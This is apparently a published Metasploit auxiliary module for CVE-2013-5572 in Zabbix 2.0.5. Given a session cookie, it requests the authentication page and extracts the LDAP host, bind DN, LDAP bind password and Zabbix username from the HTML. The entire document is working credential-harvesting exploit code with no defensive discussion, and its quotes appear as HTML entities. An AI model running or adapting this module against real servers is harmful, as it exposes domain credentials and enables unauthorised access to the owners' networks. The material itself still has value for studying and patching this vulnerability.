# This module requires Metasploit
# Date: 25-09-2013
# Author: Pablo GonzÃ¡lez
# Vendor Homepage: Zabbix -> http://www.zabbix.com
# Software Link: http://www.zabbix.com
# Version: 2.0.5
# Tested On: Linux (Ubuntu, Suse, CentOS)
# CVE: CVE-2013-5572 http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-5572
# More Info: http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2013-5572
#      http://www.elladodelmal.com/2014/12/como-crear-el-modulo-metasploit-para-el.html
#      http://seclists.org/fulldisclosure/2013/Sep/151
#          http://www.cvedetails.com/cve/CVE-2013-5572/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Auxiliary
 
  include Msf::Exploit::Remote::HttpClient
 
  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;ldap_bind_password Zabbix CVE-2013-5572&#039;,
      &#039;Description&#039;    => %q{
          Zabbix 2.0.5 allows remote authenticated users to discover the LDAP bind password by leveraging management-console access and reading the ldap_bind_password value in the HTML source code.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         => [ &#039;@pablogonzalezpe, Pablo Gonzalez&#039; ]
    ))
 
    register_options([
      OptString.new(&#039;zbx_session&#039;, [true, &#039;Cookie zbx_sessionid&#039;]),
      OptString.new(&#039;TARGETURI&#039;, [true, &#039;Path Zabbix Authentication&#039;,&#039;/zabbix/authentication.php&#039;]),
      OptInt.new(&#039;TIMEOUT&#039;, [true, &#039;HTTP read response timeout (seconds)&#039;, 5])
    ], self.class)
 
  end
 
  def run
    req
  end
  def req
    resp = send_request_cgi(
      {
        &#039;host&#039; => datastore[&#039;RHOST&#039;],
        &#039;method&#039; => &#039;POST&#039;,
        &#039;uri&#039; => normalize_uri(target_uri.path.to_s),
        &#039;cookie&#039; => "zbx_sessionid=#{datastore[&#039;zbx_session&#039;]}",
        &#039;content-type&#039; => &#039;application/x-www-form-urlencoded&#039;
      }, datastore[&#039;TIMEOUT&#039;])
         
      ldap_host(resp)
      user_passDomain(resp)
      user_zabbix(resp)
  end
   
  def ldap_host(response)
    cut = response.body.split("ldap_host\" value=\"")[1]
    if cut != nil
        host = cut.split("\"")[0]
        print_good "LDAP Host => #{host}"
    end
  end
   
  def user_passDomain(response)
    cut = response.body.split("ldap_bind_dn\" value=\"")[1]
    if cut != nil  
        user = cut.split("\"")[0]
        print_good "User Domain? => #{user}"
    end
    cut = response.body.split("name=\"ldap_bind_password\" value=\"")[1]
    if cut != nil
        pass = cut.split("\"")[0]
        print_good "Password Domain? => #{pass}"
    end
  end
 
  def user_zabbix(response)
    cut = response.body.split("user\" value=\"")[1]
    if cut != nil
        user = cut.split("\"")[0]
        print_good "User Zabbix => #{user}"
    end
  end
end

